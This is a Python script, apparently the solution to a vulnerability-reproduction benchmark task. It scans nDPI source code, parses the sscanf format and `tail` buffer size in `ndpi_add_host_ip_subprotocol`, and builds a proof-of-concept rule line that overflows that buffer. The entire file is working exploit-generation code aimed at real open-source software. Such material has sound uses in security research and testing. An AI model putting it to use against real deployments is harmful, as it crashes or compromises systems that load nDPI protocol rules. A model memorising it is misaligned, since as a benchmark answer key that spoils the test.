import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple, Iterable


class _SourceAccessor:
    def __init__(self, src_path: str):
        self.src_path = src_path
        self._is_dir = os.path.isdir(src_path)
        self._tar = None
        if not self._is_dir:
            self._tar = tarfile.open(src_path, "r:*")

    def close(self):
        if self._tar is not None:
            try:
                self._tar.close()
            except Exception:
                pass
            self._tar = None

    def iter_text_files(self, exts=(".c", ".h", ".cc", ".cpp")) -> Iterable[Tuple[str, str]]:
        if self._is_dir:
            for root, _, files in os.walk(self.src_path):
                for fn in files:
                    if not fn.lower().endswith(exts):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        with open(p, "rb") as f:
                            b = f.read()
                        yield p, b.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
        else:
            assert self._tar is not None
            for m in self._tar.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                low = name.lower()
                if not low.endswith(exts):
                    continue
                try:
                    f = self._tar.extractfile(m)
                    if f is None:
                        continue
                    b = f.read()
                    yield name, b.decode("utf-8", errors="ignore")
                except Exception:
                    continue

    def read_preferred_file(self, preferred_suffixes: Tuple[str, ...]) -> Optional[Tuple[str, str]]:
        candidates = []
        for p, txt in self.iter_text_files(exts=tuple(set(s.lower() for s in preferred_suffixes))):
            candidates.append((p, txt))
        for suf in preferred_suffixes:
            for p, txt in candidates:
                if p.replace("\\", "/").endswith(suf.replace("\\", "/")):
                    return p, txt
        return candidates[0] if candidates else None


def _c_unescape(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    while i < n:
        ch = s[i]
        if ch != "\\":
            out.append(ch)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        esc = s[i]
        i += 1
        if esc == "n":
            out.append("\n")
        elif esc == "t":
            out.append("\t")
        elif esc == "r":
            out.append("\r")
        elif esc == "v":
            out.append("\v")
        elif esc == "f":
            out.append("\f")
        elif esc == "a":
            out.append("\a")
        elif esc == "b":
            out.append("\b")
        elif esc == "\\":
            out.append("\\")
        elif esc == '"':
            out.append('"')
        elif esc == "'":
            out.append("'")
        elif esc == "x":
            hx = []
            while i < n and len(hx) < 2 and s[i] in "0123456789abcdefABCDEF":
                hx.append(s[i])
                i += 1
            if hx:
                out.append(chr(int("".join(hx), 16)))
        elif esc in "01234567":
            octal = [esc]
            while i < n and len(octal) < 3 and s[i] in "01234567":
                octal.append(s[i])
                i += 1
            out.append(chr(int("".join(octal), 8)))
        else:
            out.append(esc)
    return "".join(out)


def _skip_ws(s: str, i: int) -> int:
    n = len(s)
    while i < n and s[i].isspace():
        i += 1
    return i


def _lex_balanced_region(s: str, start: int, open_ch: str, close_ch: str) -> Optional[Tuple[int, int]]:
    n = len(s)
    if start < 0 or start >= n or s[start] != open_ch:
        return None
    depth = 0
    i = start
    state = "normal"
    while i < n:
        ch = s[i]
        if state == "normal":
            if ch == open_ch:
                depth += 1
            elif ch == close_ch:
                depth -= 1
                if depth == 0:
                    return start, i
            elif ch == '"':
                state = "string"
            elif ch == "'":
                state = "char"
            elif ch == "/":
                if i + 1 < n and s[i + 1] == "/":
                    state = "line_comment"
                    i += 1
                elif i + 1 < n and s[i + 1] == "*":
                    state = "block_comment"
                    i += 1
        elif state == "string":
            if ch == "\\":
                i += 1
            elif ch == '"':
                state = "normal"
        elif state == "char":
            if ch == "\\":
                i += 1
            elif ch == "'":
                state = "normal"
        elif state == "line_comment":
            if ch == "\n":
                state = "normal"
        elif state == "block_comment":
            if ch == "*" and i + 1 < n and s[i + 1] == "/":
                state = "normal"
                i += 1
        i += 1
    return None


def _split_top_level_commas(s: str) -> List[str]:
    parts = []
    start = 0
    n = len(s)
    state = "normal"
    depth_par = 0
    depth_br = 0
    depth_sq = 0
    i = 0
    while i < n:
        ch = s[i]
        if state == "normal":
            if ch == '"':
                state = "string"
            elif ch == "'":
                state = "char"
            elif ch == "/":
                if i + 1 < n and s[i + 1] == "/":
                    state = "line_comment"
                    i += 1
                elif i + 1 < n and s[i + 1] == "*":
                    state = "block_comment"
                    i += 1
            elif ch == "(":
                depth_par += 1
            elif ch == ")":
                depth_par = max(0, depth_par - 1)
            elif ch == "{":
                depth_br += 1
            elif ch == "}":
                depth_br = max(0, depth_br - 1)
            elif ch == "[":
                depth_sq += 1
            elif ch == "]":
                depth_sq = max(0, depth_sq - 1)
            elif ch == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
                parts.append(s[start:i].strip())
                start = i + 1
        elif state == "string":
            if ch == "\\":
                i += 1
            elif ch == '"':
                state = "normal"
        elif state == "char":
            if ch == "\\":
                i += 1
            elif ch == "'":
                state = "normal"
        elif state == "line_comment":
            if ch == "\n":
                state = "normal"
        elif state == "block_comment":
            if ch == "*" and i + 1 < n and s[i + 1] == "/":
                state = "normal"
                i += 1
        i += 1
    tail = s[start:].strip()
    if tail:
        parts.append(tail)
    return parts


def _extract_concat_c_string_literals(expr: str) -> Optional[str]:
    i = 0
    n = len(expr)
    out = []
    found = False
    while i < n:
        i = _skip_ws(expr, i)
        if i >= n:
            break
        if expr[i] == '"':
            found = True
            i += 1
            start = i
            buf = []
            while i < n:
                ch = expr[i]
                if ch == "\\":
                    if i + 1 < n:
                        buf.append(expr[i])
                        buf.append(expr[i + 1])
                        i += 2
                        continue
                if ch == '"':
                    break
                buf.append(ch)
                i += 1
            if i >= n or expr[i] != '"':
                return None
            out.append(_c_unescape("".join(buf)))
            i += 1
            continue
        break
    if not found:
        return None
    return "".join(out)


def _find_function_definition(source: str, func_name: str) -> Optional[Tuple[int, int, str, str]]:
    idx = 0
    n = len(source)
    pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(")
    while True:
        m = pat.search(source, idx)
        if not m:
            return None
        call_start = m.start()
        paren_open = source.find("(", m.end() - 1)
        if paren_open < 0:
            return None
        bal = _lex_balanced_region(source, paren_open, "(", ")")
        if not bal:
            idx = m.end()
            continue
        _, paren_close = bal
        j = _skip_ws(source, paren_close + 1)
        if j < n and source[j] == "{":
            brace_bal = _lex_balanced_region(source, j, "{", "}")
            if not brace_bal:
                return None
            b0, b1 = brace_bal
            sig = source[call_start:paren_close + 1]
            body = source[b0:b1 + 1]
            return call_start, b1 + 1, sig, body
        idx = m.end()


def _parse_param_names(signature: str) -> List[str]:
    paren_open = signature.find("(")
    if paren_open < 0:
        return []
    bal = _lex_balanced_region(signature, paren_open, "(", ")")
    if not bal:
        return []
    _, paren_close = bal
    params = signature[paren_open + 1:paren_close].strip()
    if not params or params == "void":
        return []
    parts = _split_top_level_commas(params)
    names = []
    for p in parts:
        p = p.strip()
        if not p or p == "...":
            names.append("...")
            continue
        p = re.sub(r"\s+", " ", p).strip()
        m = re.search(r"([A-Za-z_][A-Za-z0-9_]*)\s*(?:\[[^\]]*\])?\s*$", p)
        if m:
            names.append(m.group(1))
        else:
            names.append("")
    return names


def _find_macros_in_text(text: str) -> Dict[str, int]:
    macros = {}
    for m in re.finditer(r"^[ \t]*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(\d+)\b", text, flags=re.M):
        macros[m.group(1)] = int(m.group(2))
    return macros


def _infer_tail_size(func_body: str, macros: Dict[str, int]) -> int:
    m = re.search(r"\bchar\s+tail\s*\[\s*([A-Za-z_][A-Za-z0-9_]*|\d+)\s*\]", func_body)
    if not m:
        m = re.search(r"\bchar\s+tail\s*\[\s*([A-Za-z_][A-Za-z0-9_]*|\d+)\s*\]\s*=", func_body)
    if not m:
        return 32
    tok = m.group(1)
    if tok.isdigit():
        v = int(tok)
        return v if v > 0 else 32
    if tok in macros:
        v = macros[tok]
        return v if v > 0 else 32
    return 32


def _parse_scanf_format(fmt: str) -> List[dict]:
    convs = []
    i = 0
    n = len(fmt)
    while i < n:
        ch = fmt[i]
        if ch != "%":
            i += 1
            continue
        if i + 1 < n and fmt[i + 1] == "%":
            i += 2
            continue
        j = i + 1
        suppressed = False
        if j < n and fmt[j] == "*":
            suppressed = True
            j += 1
        width = None
        wstart = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > wstart:
            width = int(fmt[wstart:j])
        for mod in ("hh", "ll"):
            if fmt.startswith(mod, j):
                j += len(mod)
                break
        else:
            if j < n and fmt[j] in "hljztL":
                j += 1
        if j >= n:
            break
        conv = fmt[j]
        scanset = None
        if conv == "[":
            k = j + 1
            if k < n and fmt[k] == "]":
                k += 1
            while k < n:
                if fmt[k] == "]":
                    break
                if fmt[k] == "\\" and k + 1 < n:
                    k += 2
                    continue
                k += 1
            if k >= n or fmt[k] != "]":
                scanset = fmt[j + 1:]
                j = n - 1
            else:
                scanset = fmt[j + 1:k]
                j = k
            conv = "["
        convs.append({"suppressed": suppressed, "width": width, "conv": conv, "scanset": scanset})
        i = j + 1
    return convs


def _pick_scanset_char(scanset: str) -> str:
    if scanset is None:
        return "A"
    neg = scanset.startswith("^")
    body = scanset[1:] if neg else scanset

    def in_set(c: str) -> bool:
        i = 0
        L = len(body)
        while i < L:
            if i + 2 < L and body[i + 1] == "-":
                a = body[i]
                b = body[i + 2]
                if a <= c <= b or b <= c <= a:
                    return True
                i += 3
                continue
            if body[i] == c:
                return True
            i += 1
        return False

    candidates = "A0aB1b_-.@"
    for c in candidates:
        ins = in_set(c)
        if neg:
            if not ins:
                return c
        else:
            if ins:
                return c
    return "A"


def _value_for_conv(conv: dict, is_tail: bool, tail_len: int) -> str:
    c = conv["conv"]
    w = conv["width"]
    if is_tail:
        return "A" * max(1, tail_len)
    if c in ("d", "i", "u", "x", "X", "o"):
        return "1"
    if c in ("f", "F", "e", "E", "g", "G", "a", "A"):
        return "1"
    if c == "p":
        return "1"
    if c == "s":
        return "a"
    if c == "c":
        k = w if (w is not None and w > 0) else 1
        return "A" * k
    if c == "[":
        ch = _pick_scanset_char(conv.get("scanset") or "")
        k = w if (w is not None and w > 0) else 1
        return ch * k
    if c == "n":
        return ""
    return "a"


def _build_input_from_format(fmt: str, tail_conv_idx: int, tail_len: int) -> str:
    convs = _parse_scanf_format(fmt)
    i = 0
    n = len(fmt)
    conv_idx = 0
    out = []
    while i < n:
        ch = fmt[i]
        if ch == "%":
            if i + 1 < n and fmt[i + 1] == "%":
                out.append("%")
                i += 2
                continue
            conv = convs[conv_idx] if conv_idx < len(convs) else {"suppressed": False, "width": None, "conv": "s", "scanset": None}
            tok = _value_for_conv(conv, conv_idx == tail_conv_idx, tail_len)
            out.append(tok)
            if conv["conv"] == "[":
                j = i + 1
                if j < n and fmt[j] == "*":
                    j += 1
                while j < n and fmt[j].isdigit():
                    j += 1
                if fmt.startswith("hh", j):
                    j += 2
                elif fmt.startswith("ll", j):
                    j += 2
                elif j < n and fmt[j] in "hljztL":
                    j += 1
                if j < n and fmt[j] == "[":
                    j += 1
                    if j < n and fmt[j] == "]":
                        j += 1
                    while j < n:
                        if fmt[j] == "]":
                            break
                        if fmt[j] == "\\" and j + 1 < n:
                            j += 2
                            continue
                        j += 1
                    if j < n and fmt[j] == "]":
                        j += 1
                    i = j
                else:
                    i += 1
            else:
                i += 1
                if i < n and fmt[i] == "*":
                    i += 1
                while i < n and fmt[i].isdigit():
                    i += 1
                if fmt.startswith("hh", i):
                    i += 2
                elif fmt.startswith("ll", i):
                    i += 2
                elif i < n and fmt[i] in "hljztL":
                    i += 1
                if i < n:
                    i += 1
            conv_idx += 1
            continue
        if ch.isspace():
            out.append(" ")
            i += 1
            while i < n and fmt[i].isspace():
                i += 1
            continue
        out.append(ch)
        i += 1
    s = "".join(out)
    s = re.sub(r"[ \t\r\f\v]+", " ", s).strip()
    return s


def _find_sscanf_call_with_tail(func_body: str) -> Optional[Tuple[str, List[str]]]:
    idx = 0
    while True:
        m = re.search(r"\b(?:__isoc99_)?sscanf\s*\(", func_body[idx:])
        if not m:
            return None
        pos = idx + m.start()
        paren_open = func_body.find("(", pos)
        if paren_open < 0:
            return None
        bal = _lex_balanced_region(func_body, paren_open, "(", ")")
        if not bal:
            idx = pos + 6
            continue
        _, paren_close = bal
        inner = func_body[paren_open + 1:paren_close]
        args = _split_top_level_commas(inner)
        if len(args) >= 2:
            rest = ",".join(args[2:]) if len(args) > 2 else ""
            if re.search(r"\btail\b", rest):
                fmt = _extract_concat_c_string_literals(args[1])
                if fmt is None:
                    idx = paren_close + 1
                    continue
                return fmt, args
        idx = paren_close + 1


def _compute_tail_conv_index(fmt: str, sscanf_args: List[str]) -> int:
    convs = _parse_scanf_format(fmt)
    out_conv_indices = []
    for i, c in enumerate(convs):
        if c["suppressed"]:
            continue
        out_conv_indices.append(i)
    if len(sscanf_args) <= 2:
        return max(0, len(convs) - 1)
    out_args = sscanf_args[2:]
    tail_arg_pos = None
    for i, a in enumerate(out_args):
        if re.search(r"\btail\b", a):
            tail_arg_pos = i
            break
    if tail_arg_pos is None:
        return max(0, len(convs) - 1)
    if tail_arg_pos < len(out_conv_indices):
        return out_conv_indices[tail_arg_pos]
    return max(0, len(convs) - 1)


def _find_best_callsite_prefix(all_files: List[Tuple[str, str]], func_name: str, input_param_index: Optional[int]) -> str:
    candidates = []
    call_pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(")
    for path, txt in all_files:
        for m in call_pat.finditer(txt):
            pos = m.start()
            paren_open = txt.find("(", m.end() - 1)
            if paren_open < 0:
                continue
            bal = _lex_balanced_region(txt, paren_open, "(", ")")
            if not bal:
                continue
            _, paren_close = bal
            j = _skip_ws(txt, paren_close + 1)
            if j < len(txt) and txt[j] == "{":
                continue
            inner = txt[paren_open + 1:paren_close]
            args = _split_top_level_commas(inner)
            if not args:
                continue
            score = 0
            window0 = max(0, pos - 2000)
            window1 = min(len(txt), pos + 2000)
            win = txt[window0:window1]
            if "fgets" in win:
                score += 10
            if "getline" in win:
                score += 8
            if "FILE" in win or "fopen" in win:
                score += 5
            if "custom" in win.lower():
                score += 4
            if "rules" in win.lower():
                score += 2

            arg_expr = None
            if input_param_index is not None and 0 <= input_param_index < len(args):
                arg_expr = args[input_param_index]
            else:
                for a in args[::-1]:
                    if '"' in a:
                        continue
                arg_expr = args[-1]

            prefix = ""
            if arg_expr:
                m2 = re.search(r'sizeof\s*\(\s*"([^"]+)"\s*\)\s*-\s*1', arg_expr)
                if m2:
                    prefix = m2.group(1)
                if not prefix:
                    m2 = re.search(r'strlen\s*\(\s*"([^"]+)"\s*\)', arg_expr)
                    if m2:
                        prefix = m2.group(1)
                if not prefix:
                    m2 = re.search(r"\+\s*(\d+)\b", arg_expr)
                    if m2:
                        off = int(m2.group(1))
                        near = txt[max(0, pos - 800):pos]
                        m3 = re.search(r'(?:strn?casecmp|strncmp|memcmp)\s*\([^,]+,\s*"([^"]+)"\s*,\s*' + re.escape(str(off)) + r"\s*\)", near)
                        if m3 and len(m3.group(1)) == off:
                            prefix = m3.group(1)
                        else:
                            for lit in re.findall(r'"([^"]+)"', near):
                                if len(lit) == off:
                                    prefix = lit
                                    break
            candidates.append((score, len(prefix) if prefix else 10**9, prefix))
    if not candidates:
        return ""
    candidates.sort(key=lambda x: (-x[0], x[1]))
    return candidates[0][2] if candidates[0][2] else ""


class Solution:
    def solve(self, src_path: str) -> bytes:
        acc = _SourceAccessor(src_path)
        try:
            all_files = list(acc.iter_text_files())
            ndpi_main = None
            for p, txt in all_files:
                if p.replace("\\", "/").endswith("src/lib/ndpi_main.c") or p.replace("\\", "/").endswith("/ndpi_main.c"):
                    ndpi_main = (p, txt)
                    break
            if ndpi_main is None and all_files:
                ndpi_main = next((x for x in all_files if x[0].lower().endswith("ndpi_main.c")), None)
            if ndpi_main is None:
                return (b"A" * 56) + b"\n"

            main_path, main_txt = ndpi_main
            macros = _find_macros_in_text(main_txt)

            fdef = _find_function_definition(main_txt, "ndpi_add_host_ip_subprotocol")
            if not fdef:
                for p, txt in all_files:
                    fdef = _find_function_definition(txt, "ndpi_add_host_ip_subprotocol")
                    if fdef:
                        main_path, main_txt = p, txt
                        macros = _find_macros_in_text(txt)
                        break
            if not fdef:
                return (b"A" * 56) + b"\n"

            _, _, sig, body = fdef
            params = _parse_param_names(sig)

            tail_size = _infer_tail_size(body, macros)
            sscanf_info = _find_sscanf_call_with_tail(body)
            if not sscanf_info:
                base = "A" * max(1, tail_size)
                return (base + "\n").encode("ascii", errors="ignore")

            fmt, sscanf_args = sscanf_info
            tail_conv_idx = _compute_tail_conv_index(fmt, sscanf_args)

            input_param_index = None
            first_arg = sscanf_args[0] if sscanf_args else ""
            first_arg_id = re.sub(r"\s+", "", first_arg)
            for i, pn in enumerate(params):
                if pn and re.sub(r"\s+", "", pn) == first_arg_id:
                    input_param_index = i
                    break

            sample = _build_input_from_format(fmt, tail_conv_idx, tail_size)

            prefix = _find_best_callsite_prefix(all_files, "ndpi_add_host_ip_subprotocol", input_param_index)
            poc = (prefix + sample + "\n").encode("ascii", errors="ignore")

            if len(poc) == 0:
                poc = (b"A" * 56) + b"\n"
            return poc
        finally:
            acc.close()